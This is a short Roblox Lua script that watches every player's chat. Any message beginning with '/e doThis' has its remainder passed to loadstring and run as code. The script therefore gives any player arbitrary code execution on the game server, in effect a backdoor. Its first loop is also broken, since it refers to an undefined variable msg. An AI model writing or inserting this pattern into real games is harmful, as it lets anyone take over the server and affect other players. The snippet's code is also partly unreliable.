function check(inputString)
    local prefix = "/e doThis"
    
    if string.sub(inputString, 1, #prefix) == prefix then
        local restOfString = string.sub(inputString, #prefix + 1)
        return restOfString
    else
        return false
    end
end

for _, plr in pairs(game.Players:GetPlayers()) do
    local CHECK = check(msg)
    
    if CHECK then
        loadstring(CHECK)()
    end
end

game.Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        local CHECK = check(msg)
    
        if CHECK then
            loadstring(CHECK)()
        end
    end)
end)
